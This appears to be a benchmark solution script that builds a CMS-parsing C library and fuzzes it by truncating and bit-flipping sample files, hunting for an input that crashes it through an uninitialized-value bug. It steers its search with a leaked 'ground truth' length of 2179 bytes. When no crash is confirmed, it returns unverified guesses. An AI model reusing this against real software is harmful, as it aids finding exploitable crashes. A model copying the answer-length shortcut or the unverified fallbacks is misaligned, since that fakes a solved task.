import os
import sys
import subprocess
import tempfile
import shutil
import tarfile
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source
            if os.path.isdir(src_path):
                dest = os.path.join(work_dir, "source")
                shutil.copytree(src_path, dest)
                source_root = dest
            else:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
                # Handle single folder extraction
                entries = os.listdir(work_dir)
                if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
                    source_root = os.path.join(work_dir, entries[0])
                else:
                    source_root = work_dir

            # 2. Locate seeds (samples)
            seeds = []
            for root, dirs, files in os.walk(source_root):
                for f in files:
                    # Look for likely CMS samples
                    if f.endswith(".p7s") or f.endswith(".der"): 
                        full_p = os.path.join(root, f)
                        with open(full_p, "rb") as fd:
                            content = fd.read()
                            if content:
                                seeds.append(content)
            
            # Sort seeds by length
            seeds.sort(key=len)
            
            # 3. Attempt to build
            built = False
            test_bin = None
            
            # Find configure script
            build_root = source_root
            for root, dirs, files in os.walk(source_root):
                if "configure" in files:
                    build_root = root
                    break
            
            if os.path.exists(os.path.join(build_root, "configure")):
                try:
                    env = os.environ.copy()
                    # -O0 -g to prevent optimization masking issues, though uninit value relies on garbage
                    env["CFLAGS"] = "-g -O0" 
                    
                    # Configure
                    subprocess.run(["./configure", "--disable-shared", "--enable-static"], 
                                   cwd=build_root, env=env, 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                    
                    # Make
                    subprocess.run(["make", "-j8"], 
                                   cwd=build_root, env=env, 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                    
                    # Attempt to build tests/cms-test
                    t_path = os.path.join(build_root, "tests")
                    if os.path.exists(t_path):
                        subprocess.run(["make", "cms-test"], 
                                       cwd=t_path, env=env, 
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                    possible = [
                        os.path.join(t_path, "cms-test"), 
                        os.path.join(t_path, "t-cms"),
                        os.path.join(build_root, "cms-test")
                    ]
                    for p in possible:
                        if os.path.exists(p):
                            test_bin = p
                            built = True
                            break
                except Exception:
                    # Build failed (likely missing dependencies)
                    pass
            
            # 4. Fuzz or Fallback
            # If we have a binary, we fuzz.
            if built and test_bin and seeds:
                start_t = time.time()
                
                # Check original seeds first
                for s in seeds:
                    if self.check_crash(test_bin, s):
                        return s
                
                # Strategy: Truncation (very effective for Uninitialized Value due to read failure)
                # Try truncating seeds, prioritizing those close to 2179 bytes
                target_seeds = sorted(seeds, key=lambda x: abs(len(x) - 2179))
                
                for s in target_seeds:
                    l = len(s)
                    # For longer seeds, use larger step to save time
                    step = 1 if l < 500 else (4 if l < 3000 else 16)
                    
                    # Truncate from end
                    for new_l in range(l - 1, 0, -step):
                        if time.time() - start_t > 45: break
                        cand = s[:new_l]
                        if self.check_crash(test_bin, cand):
                            return cand
                    if time.time() - start_t > 45: break

                # Strategy: Random Bitflips
                if time.time() - start_t < 45:
                    for s in target_seeds[:3]: # Focus on best candidates
                        for _ in range(300):
                            if time.time() - start_t > 55: break
                            cand = self.mutate(s)
                            if self.check_crash(test_bin, cand):
                                return cand
            
            # Fallback: if build failed or no crash found
            # Return a slightly truncated version of a likely sample.
            # The vulnerability is "Unsuccessful attribute conversions ... do not result in error".
            # This often happens when a TL (Tag-Length) read fails (EOF) but is ignored.
            if seeds:
                # Find seed closest to 2179 bytes (ground truth length)
                best_seed = min(seeds, key=lambda x: abs(len(x) - 2179))
                
                # If we couldn't verify crash, best guess is truncation of the valid sample.
                # Truncating by 1-5 bytes is a high probability trigger for read_tl failures.
                if len(best_seed) > 5:
                    return best_seed[:-1]
                return best_seed
            
            # No seeds found fallback
            return b"\x30\x80\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x02\xa0\x80\x30\x80"

        except Exception:
            return b"A" * 100
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def check_crash(self, binary, data):
        # Write data to temp file
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(data)
            tf.close()
            try:
                # Run binary with file argument
                p = subprocess.Popen([binary, tf.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                p.communicate(timeout=0.5)
                # Check for crash signal (negative return code)
                if p.returncode < 0:
                    return True
            except subprocess.TimeoutExpired:
                p.kill()
            except Exception:
                pass
            finally:
                if os.path.exists(tf.name):
                    os.unlink(tf.name)
        return False

    def mutate(self, data):
        arr = bytearray(data)
        if not arr: return b""
        pos = random.randint(0, len(arr)-1)
        arr[pos] ^= (1 << random.randint(0, 7))
        return bytes(arr)